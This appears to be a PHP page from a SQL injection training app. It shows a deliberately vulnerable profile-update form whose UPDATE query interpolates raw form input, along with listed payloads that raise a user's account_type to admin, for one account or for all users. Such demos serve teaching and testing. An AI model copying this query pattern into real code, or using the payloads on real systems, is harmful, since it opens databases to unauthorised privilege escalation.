<?php
/**
 * DEMO: Privilege Escalation via SQL Injection
 *
 * Attack goal: Inject into the UPDATE query to modify your own account_type to 'admin'
 * by breaking out of the SET clause and appending extra columns.
 *
 * The UPDATE is built like:
 *   UPDATE user SET firstname='{first_name}', ... WHERE id={id}
 *
 * Payload for "first_name" field:
 *   anything', account_type='admin
 *
 * This turns the query into:
 *   UPDATE user SET firstname='anything', account_type='admin', lastname=... WHERE id=X
 *
 * Or bypass the WHERE clause entirely with:
 *   First name: anything', account_type='admin' WHERE id=YOUR_ID--
 */

if ( ! defined('SQL_INJECTION_IN_PHP') ) {
    die('Direct access not permitted');
}

$message = '';
$current_user = null;

// Fetch the currently logged-in user's details to show before/after
if (isset($_SESSION['id'])) {
    $stmt = $pdo->prepare("SELECT id, firstname, lastname, email, account_type FROM user WHERE id = :id");
    $stmt->execute([':id' => $_SESSION['id']]);
    $current_user = $stmt->fetch(\PDO::FETCH_ASSOC);
}

// Process the vulnerable UPDATE
if (isset($_POST['escalate'])) {
    $id         = $_POST['uid']        ?? $_SESSION['id'];
    $first_name = $_POST['first_name'] ?? '';
    $last_name  = $_POST['last_name']  ?? '';

    // VULNERABLE — raw string interpolation
    $sql = "UPDATE user SET firstname='{$first_name}', lastname='{$last_name}' WHERE id={$id}";

    echo '<div class="alert alert-secondary"><strong>Generated SQL:</strong><br><code>' . htmlspecialchars($sql) . '</code></div>';

    try {
        $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);
        $result = $pdo->exec($sql);

        // Re-fetch to show what changed
        $stmt = $pdo->prepare("SELECT id, firstname, lastname, email, account_type FROM user WHERE id = :id");
        $stmt->execute([':id' => $id]);
        $updated = $stmt->fetch(\PDO::FETCH_ASSOC);

        $message = '<div class="alert alert-' . ($updated['account_type'] === 'admin' ? 'danger' : 'success') . '">';
        $message .= '<strong>Update executed.</strong><br>';
        $message .= 'New account_type: <strong>' . htmlspecialchars($updated['account_type']) . '</strong>';
        if ($updated['account_type'] === 'admin') {
            $message .= ' 🚨 <em>Privilege escalation succeeded!</em>';
        }
        $message .= '</div>';
    } catch (\PDOException $e) {
        $message = '<div class="alert alert-danger"><strong>DB Error:</strong> ' . htmlspecialchars($e->getMessage()) . '</div>';
    }
}
?>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white">
    <strong>⚠️ Vulnerable Page — Privilege Escalation via SQLi Demo</strong>
  </div>
  <div class="card-body">
    <p class="mb-1"><strong>Objective:</strong> Inject into the UPDATE query to escalate your own <code>account_type</code> from <code>user</code> to <code>admin</code>.</p>
    <p class="mb-1"><strong>Vulnerable query pattern:</strong></p>
    <code>UPDATE user SET firstname='{first_name}', lastname='{last_name}' WHERE id={id}</code>
    <p class="mt-2 mb-1"><strong>Payload for "First Name" field:</strong></p>
    <ul class="mb-0">
      <li><code>anything', account_type='admin</code> — injects extra column into SET</li>
      <li><code>anything', account_type='admin' WHERE id=YOUR_ID-- </code> — scoped escalation</li>
      <li><code>anything', account_type='admin' WHERE '1'='1</code> — escalates ALL users</li>
    </ul>
    <p class="mt-2 mb-0 text-muted small">Check your account_type before and after to see the change.</p>
  </div>
</div>

<?php if ($current_user): ?>
<div class="alert alert-info">
  <strong>Your current account:</strong>
  ID: <code><?= htmlspecialchars($current_user['id']) ?></code> |
  Name: <code><?= htmlspecialchars($current_user['firstname'] . ' ' . $current_user['lastname']) ?></code> |
  Role: <strong><?= htmlspecialchars($current_user['account_type']) ?></strong>
</div>
<?php endif; ?>

<?= $message ?>

<div class="card">
  <div class="card-header">Vulnerable Profile Update Form</div>
  <div class="card-body">
    <form method="post">
      <div class="mb-3">
        <label class="form-label">User ID (target)</label>
        <input type="text" name="uid" class="form-control" style="max-width:200px"
               value="<?= htmlspecialchars($_SESSION['id'] ?? '1') ?>">
        <small class="text-muted">Defaults to your own ID — try changing to attack another user</small>
      </div>
      <div class="mb-3">
        <label class="form-label">First Name</label>
        <input type="text" name="first_name" class="form-control"
               placeholder="Try: anything', account_type='admin">
        <small class="text-muted">Inject here to add extra columns to the SET clause</small>
      </div>
      <div class="mb-3">
        <label class="form-label">Last Name</label>
        <input type="text" name="last_name" class="form-control" placeholder="Last name">
      </div>
      <button type="submit" name="escalate" class="btn btn-danger">Update Profile</button>
    </form>
  </div>
</div>
